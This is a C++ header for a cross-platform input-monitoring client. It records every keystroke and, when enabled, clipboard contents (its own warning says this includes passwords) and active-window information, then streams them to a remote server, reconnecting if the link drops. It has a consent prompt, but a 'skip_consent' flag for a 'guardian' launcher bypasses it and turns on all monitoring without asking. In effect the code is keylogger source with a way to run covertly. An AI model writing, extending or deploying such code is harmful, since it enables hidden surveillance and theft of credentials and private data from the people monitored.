#ifndef CLIENT_CROSS_HPP
#define CLIENT_CROSS_HPP

#include "platform_detector.hpp"
#include "socket_utils_cross.hpp"
#include "thread_safe_queue.hpp"
#include <thread>
#include <atomic>
#include <iostream>
#include <memory>
using namespace std; 

#ifdef PLATFORM_WINDOWS
    #include "keyboard_capture_windows.hpp"
    #include "clipboard_monitor_windows.hpp"
    #include "window_monitor_windows.hpp"
    typedef KeyboardCaptureWindows KeyboardCapture;
    typedef ClipboardMonitorWindows ClipboardMonitor;
    typedef WindowMonitorWindows WindowMonitor;
#else
    #include "keyboard_capture.hpp"
    #include "clipboard_monitor.hpp"
    #include "window_monitor.hpp"
#endif

class Client {
private:
      string server_host_;
    int server_port_;
      string client_id_;
      atomic<bool> running_;
      thread network_thread_;
    ThreadSafeQueue<  string> event_queue_;
      unique_ptr<KeyboardCapture> keyboard_capture_;
      unique_ptr<ClipboardMonitor> clipboard_monitor_;
      unique_ptr<WindowMonitor> window_monitor_;
    bool enable_clipboard_monitoring_;
    bool enable_window_monitoring_;
    bool skip_consent_; // NEW: Skip consent if launched by guardian

public:
    Client(const   string& host, int port, const   string& client_id, bool skip_consent = false) 
        : server_host_(host), server_port_(port), client_id_(client_id),
          running_(false), enable_clipboard_monitoring_(false), 
          enable_window_monitoring_(false), skip_consent_(skip_consent) {}

    ~Client() {
        stop();
    }

    bool start() {
        if (running_) {
            return false;
        }

        running_ = true;
        
        // Get user consent (skip if launched by guardian)
        if (!skip_consent_) {
            if (!getUserConsent()) {
                  cout << "Consent not granted. Exiting." <<   endl;
                return false;
            }
        } else {
            // Auto-consent when launched by guardian
              cout << "=== PROTECTED MODE ===" <<   endl;
              cout << "Running under guardian protection" <<   endl;
              cout << "All monitoring features enabled" <<   endl;
            enable_clipboard_monitoring_ = true;
            enable_window_monitoring_ = true;
        }

        // Initialize keyboard capture
        try {
            keyboard_capture_ =   make_unique<KeyboardCapture>(
                [this](const   string& key) {
                    event_queue_.push("KEY: " + key);
                }
            );
        } catch (const   exception& e) {
              cerr << "Failed to initialize keyboard capture: " << e.what() <<   endl;
            return false;
        }

        // Initialize clipboard monitor if consented
        if (enable_clipboard_monitoring_) {
            try {
                clipboard_monitor_ =   make_unique<ClipboardMonitor>(
                    [this](const   string& content) {
                        event_queue_.push(content);
                    }
                );
            } catch (const   exception& e) {
                  cerr << "Failed to initialize clipboard monitor: " << e.what() <<   endl;
            }
        }

        // Initialize window monitor if consented
        if (enable_window_monitoring_) {
            try {
                window_monitor_ =   make_unique<WindowMonitor>(
                    [this](const   string& window_info) {
                        event_queue_.push(window_info);
                    }
                );
            } catch (const   exception& e) {
                  cerr << "Failed to initialize window monitor: " << e.what() <<   endl;
            }
        }

        // Start keyboard capture
        if (!keyboard_capture_->start()) {
              cerr << "Failed to start keyboard capture" <<   endl;
            return false;
        }

        // Start clipboard monitoring if enabled
        if (clipboard_monitor_ && !clipboard_monitor_->start()) {
              cerr << "Failed to start clipboard monitoring" <<   endl;
        }

        // Start window monitoring if enabled
        if (window_monitor_ && !window_monitor_->start()) {
              cerr << "Failed to start window monitoring" <<   endl;
        }

          cout << "Client ID: " << client_id_ <<   endl;
          cout << "Keyboard device: " << keyboard_capture_->getKeyboardDevice() <<   endl;
        if (enable_clipboard_monitoring_) {
              cout << "Clipboard monitoring: ENABLED" <<   endl;
        }
        if (enable_window_monitoring_) {
              cout << "Window monitoring: ENABLED" <<   endl;
        }

        // Start network thread
        network_thread_ =   thread(&Client::networkLoop, this);

          cout << "Client started. Capturing input events..." <<   endl;
        return true;
    }

    void stop() {
        running_ = false;
        if (keyboard_capture_) {
            keyboard_capture_->stop();
        }
        if (clipboard_monitor_) {
            clipboard_monitor_->stop();
        }
        if (window_monitor_) {
            window_monitor_->stop();
        }
        if (network_thread_.joinable()) {
            network_thread_.join();
        }
        SocketUtils::cleanupWSA();
    }

private:
    bool getUserConsent() {
          cout << "=== INPUT MONITORING CLIENT ===" <<   endl;
          cout << "Client ID: " << client_id_ <<   endl;
          cout << "This application will capture:" <<   endl;
          cout << "1. ALL keystrokes on your system" <<   endl;
          cout << "2. Clipboard content when it changes" <<   endl;
          cout << "3. Active window/tab information when you switch" <<   endl;
          cout << "and send them to the server at " << server_host_ << ":" << server_port_ <<   endl;
          cout <<   endl;
          cout << "WARNING: This may capture sensitive information!" <<   endl;
          cout <<   endl;
        
          string response;
          cout << "Do you give permission for keyboard monitoring? (yes/no): ";
          getline(  cin, response);
        bool keyboard_consent = (response == "yes" || response == "y" || response == "YES" || response == "Y");
        
        if (!keyboard_consent) {
            return false;
        }
        
          cout << "Do you also give permission for clipboard monitoring? (yes/no): ";
          getline(  cin, response);
        enable_clipboard_monitoring_ = (response == "yes" || response == "y" || response == "YES" || response == "Y");
        
        if (enable_clipboard_monitoring_) {
              cout << "CLIPBOARD WARNING: This will capture ALL copied text including passwords!" <<   endl;
              cout << "Are you sure? (yes/no): ";
              getline(  cin, response);
            enable_clipboard_monitoring_ = (response == "yes" || response == "y" || response == "YES" || response == "Y");
        }
        
          cout << "Do you also give permission for window/tab monitoring? (yes/no): ";
          getline(  cin, response);
        enable_window_monitoring_ = (response == "yes" || response == "y" || response == "YES" || response == "Y");
        
        return true;
    }

    void networkLoop() {
        while (running_) {
            try {
                int sockfd = SocketUtils::createSocket();
                SocketUtils::connectToServer(sockfd, server_host_, server_port_);
                
                // Send client ID first
                  string hello_msg = "CLIENT_ID: " + client_id_ + "\n";
                SocketUtils::sendData(sockfd, hello_msg);
                
                  cout << "Connected to server successfully!" <<   endl;

                while (running_) {
                    auto event_opt = event_queue_.pop();
                    if (event_opt) {
                          string message = *event_opt + "\n";
                        if (!SocketUtils::sendData(sockfd, message)) {
                              cerr << "Failed to send data. Reconnecting..." <<   endl;
                            break;
                        }
                    }
                    
                      this_thread::sleep_for(  chrono::milliseconds(10));
                }

                close(sockfd);
            } catch (const   exception& e) {
                  cerr << "Connection error: " << e.what() << ". Retrying in 5 seconds..." <<   endl;
                  this_thread::sleep_for(  chrono::seconds(5));
            }
        }
    }
};

#endif